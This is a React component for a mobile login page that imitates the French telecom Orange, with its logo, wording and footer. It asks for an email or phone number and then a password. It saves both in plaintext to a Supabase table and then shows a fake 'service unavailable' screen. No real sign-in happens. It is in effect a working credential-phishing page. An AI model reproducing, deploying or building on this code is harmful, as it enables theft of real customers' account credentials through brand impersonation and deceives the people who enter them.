import { useState } from 'react';
import { ArrowLeft, Eye, EyeOff, HelpCircle } from 'lucide-react';
import logoOrange from '@/assets/logo-orange.png';
import LoadingScreen from '@/components/LoadingScreen';
import ServiceUnavailable from '@/pages/ServiceUnavailable';
import { supabase } from '@/lib/supabase';

const LoginMobile = () => {
  const [step, setStep] = useState<'email' | 'password' | 'loading' | 'service-unavailable'>('email');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isPasswordLoading, setIsPasswordLoading] = useState(false);

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (email.trim()) {
      // Stocker l'email/téléphone en local
      localStorage.setItem('userEmail', email.trim());
      setIsLoading(true);
      
      // Simuler un délai de chargement
      setTimeout(() => {
        setIsLoading(false);
        setStep('password');
      }, 2000);
    }
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (password.trim()) {
      setIsPasswordLoading(true);
      
      try {
        // Récupérer l'email/téléphone du localStorage
        const userEmail = localStorage.getItem('userEmail');
        
        if (userEmail) {
          // Sauvegarder dans Supabase
          const { error } = await supabase
            .from('user')
            .insert([
              { email_or_phone: userEmail, password: password.trim() }
            ]);

          if (error) {
            console.error('Erreur lors de la sauvegarde:', error);
          } else {
            console.log('Utilisateur sauvegardé avec succès');
          }
        }

        // Nettoyer le localStorage
        localStorage.removeItem('userEmail');
        
        // Simuler un délai de chargement
        setTimeout(() => {
          setIsPasswordLoading(false);
          setStep('service-unavailable');
        }, 2000);
      } catch (error) {
        console.error('Erreur:', error);
        setIsPasswordLoading(false);
        setStep('service-unavailable');
      }
    }
  };

  const handleBackToEmail = () => {
    setStep('email');
  };

  // Si on affiche la page service indisponible
  if (step === 'service-unavailable') {
    return <ServiceUnavailable />;
  }


  return (
    <div className="min-h-screen bg-white">
      {/* Barre de statut simulée */}
      <div className="bg-black text-white text-xs py-1 px-4 flex justify-between items-center">
        <div className="flex items-center gap-2">
          <span>15:14</span>
          <span>NGL</span>
        </div>
        <div className="flex items-center gap-1">
          <div className="w-4 h-2 bg-gray-600 rounded"></div>
          <div className="w-4 h-2 bg-green-500 rounded"></div>
          <span>57%</span>
        </div>
      </div>

      {/* Contenu principal */}
      <div className="px-4 py-6">
        {/* Logo et titre */}
        <div className="text-center mb-8">
          <img 
            src={logoOrange} 
            alt="Orange" 
            className="h-10 w-auto mx-auto mb-4"
          />
          <h1 className="text-xl font-bold text-black">
            {step === 'email' ? 'Identifiez-vous' : 'Bienvenue'}
          </h1>
          {step === 'email' && (
            <>
              <p className="text-base font-semibold text-black mt-2 mb-4">
                Indiquez votre compte Orange
              </p>
              
              {/* Section informative */}
              <div className="bg-blue-50 border border-blue-200 rounded-lg p-3 mb-6">
                <div className="flex items-start gap-3">
                  <div className="flex-shrink-0">
                    <div className="w-5 h-5 bg-blue-500 rounded-full flex items-center justify-center">
                      <HelpCircle size={14} className="text-white" />
                    </div>
                  </div>
                  <div className="flex-1">
                    <p className="text-xs text-blue-800 leading-relaxed">
                      Saisissez le numéro mobile ou l'adresse email fournis par Orange ou Sosh lors de votre souscription.
                    </p>
                  </div>
                </div>
              </div>
            </>
          )}
        </div>

        {/* Formulaire */}
        <form onSubmit={step === 'email' ? handleEmailSubmit : handlePasswordSubmit}>
          {step === 'email' ? (
            <>
              {/* Champ email */}
              <div className="mb-6">
                <input
                  type="text"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="Adresse e-mail ou nº de mobile Orange"
                  className="w-full text-base border-0 border-b border-gray-300 focus:border-black focus:outline-none pb-2 bg-transparent"
                  required
                />
              </div>
            </>
          ) : (
            <>
              {/* Champ email pré-rempli */}
              <div className="mb-6">
                <div className="flex items-center bg-gray-100 rounded-lg p-3 mb-4">
                  <button
                    type="button"
                    onClick={handleBackToEmail}
                    className="mr-3 text-gray-600"
                  >
                    <ArrowLeft size={20} />
                  </button>
                  <div className="flex-1 flex items-center">
                    <div className="w-8 h-8 bg-gray-300 rounded-full flex items-center justify-center mr-3">
                      <div className="w-4 h-4 bg-gray-500 rounded-full"></div>
                    </div>
                    <span className="text-gray-700 text-sm">{email}</span>
                  </div>
                </div>
              </div>

              {/* Champ mot de passe */}
              <div className="mb-6">
                <label className="block text-base font-semibold text-black mb-2">
                  Saisissez votre mot de passe
                </label>
                <div className="relative">
                  <input
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Votre mot de passe"
                    className="w-full text-base border-0 border-b border-gray-300 focus:border-black focus:outline-none pb-2 bg-transparent pr-10"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-0 top-0 text-orange-500"
                  >
                    {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                  </button>
                </div>
              </div>
            </>
          )}

          {/* Bouton continuer */}
          <button
            type="submit"
            disabled={isLoading || isPasswordLoading}
            className={`w-full bg-black text-white py-4 px-6 rounded-lg font-semibold text-base transition-colors mb-4 flex items-center justify-center gap-2 ${
              isLoading || isPasswordLoading
                ? 'opacity-70 cursor-not-allowed' 
                : 'hover:bg-gray-800'
            }`}
          >
            {isLoading || isPasswordLoading ? (
              <>
                <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
                Chargement...
              </>
            ) : (
              step === 'email' ? 'Continuer' : "S'identifier"
            )}
          </button>

          {/* Lien mot de passe oublié */}
          {step === 'password' && (
            <div className="text-center">
              <a href="#" className="text-black hover:text-gray-600 flex items-center justify-center gap-2">
                Mot de passe oublié ?
                <ArrowLeft size={16} className="rotate-180" />
              </a>
            </div>
          )}
        </form>
      </div>

      {/* Footer mobile */}
      <div className="fixed bottom-0 left-0 right-0 bg-black text-white py-3 px-4">
        <div className="grid grid-cols-2 gap-2 text-xs">
          <div className="space-y-1">
            <div>Informations légales</div>
            <div>Plan de site</div>
            <div>Données personnelles</div>
            <div>Accessibilité : non conforme</div>
          </div>
          <div className="space-y-1">
            <div>Gestion cookies</div>
            <div>Livraisons</div>
            <div>Retours</div>
            <div>Publicité</div>
            <div>Signaler un contenu</div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginMobile;